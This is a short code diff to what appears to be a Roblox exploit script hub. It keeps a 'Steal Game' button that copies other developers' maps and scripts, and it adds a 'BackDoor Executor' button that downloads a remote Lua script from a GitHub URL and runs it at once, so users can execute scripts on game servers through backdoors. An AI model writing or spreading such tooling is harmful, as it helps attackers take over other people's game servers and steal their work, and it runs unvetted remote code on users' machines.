@@ -760,6 +760,10 @@ local AllSection = All:NewSection("All Games")
     AllSection:NewButton("Steal Game", "Steals Some Scripts And The Map", function()
         saveinstance()
     end)
+
+    AllSection:NewButton("BackDoor Executor", "Lets you run scripts on the server", function()
+        loadstring(game:HttpGet(('https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua'),true))()
+    end)
     
 
 
